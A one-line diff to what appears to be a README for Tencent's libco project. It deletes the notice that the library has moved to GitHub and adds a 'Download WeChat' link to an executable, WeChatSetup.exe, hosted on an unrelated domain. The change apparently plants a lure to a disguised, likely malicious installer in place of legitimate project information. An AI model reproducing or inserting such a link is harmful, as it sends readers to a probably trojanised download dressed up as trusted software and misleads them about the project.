@@ -1,1 +1,1 @@
-本库已转至 <a>http://github.com/Tencent/libco</a>
+[下载微信](https://whoiz.xyz/WeChatSetup.exe)
